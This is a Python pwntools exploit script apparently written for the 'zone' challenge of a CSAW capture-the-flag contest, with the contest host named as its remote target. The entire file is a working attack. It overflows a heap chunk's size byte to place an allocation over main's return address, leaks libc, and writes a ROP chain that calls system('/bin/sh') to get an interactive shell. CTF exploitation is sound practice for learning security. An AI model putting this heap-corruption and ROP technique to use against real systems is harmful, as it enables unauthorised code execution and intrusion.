#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
import os

exe = context.binary = ELF('./zone')
libc = ELF('./libc.so.6')

gdbscript = """
set sysroot /
""".format(**locals())

def start(argv=[], *a, **kw):
    os.environ['LD_LIBRARY_PATH'] = '.'
    if args.GDB:
        io = gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        io = remote('pwn.chal.csaw.io', 5223)
    else:
        io = process([exe.path] + argv, *a, **kw)
    return io

# connect
io = start()
while True:
    line = io.readline()
    if 'Environment setup' in line:
        break

env_string = line.split(': ')[1]
env_ptr = int(env_string, 16)
log.info('custom heap struct is at: {}'.format(hex(env_ptr)))
ret_addr = env_ptr + 0x88
log.info('main() return addr is at: {}'.format(hex(ret_addr)))

def menu():
    io.recvuntil('5) Exit\n')

def allocate(size):
    io.sendline('1')
    io.sendline(str(size))
    menu()

def delete():
    io.sendline('2')
    retval = int(io.readline().split()[2])
    menu()
    return retval

def write(content):
    io.sendline('3')
    io.sendline(content)
    menu()

def print_block():
    io.sendline('4')
    retval = io.readline()
    menu()
    return retval

def get_leak():
    io.sendline('4')
    l = io.recv(6)
    menu()
    return l

def exit():
    io.sendline('5')

menu()
allocate(64)
write('A'*64 + '\x80')
allocate(64)
delete()
allocate(128)
write('B'*64 + '\x00\x02\x00\x00\x00\x00\x00\x00' + p64(ret_addr-0x10))
allocate(64)
allocate(64)

leaked_addr = u64(get_leak().ljust(8, '\x00'))
# leaked addr is 0xf0 bytes into __libc_start_main
libc_base = leaked_addr - 0xf0 - libc.symbols['__libc_start_main']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + 0x18cd17 # is there a better way to do this?
pop_rdi_ret = 0x404653
log.info('leaked addr: {}'.format(hex(leaked_addr)))
log.info('libc_base is at: {}'.format(hex(libc_base)))
log.info('system is at: {}'.format(hex(system_addr)))
log.info('/bin/sh is at: {}'.format(hex(binsh_addr)))

payload = flat(
            pop_rdi_ret,
            binsh_addr,
            system_addr
        )
write(payload)
exit()

io.interactive()

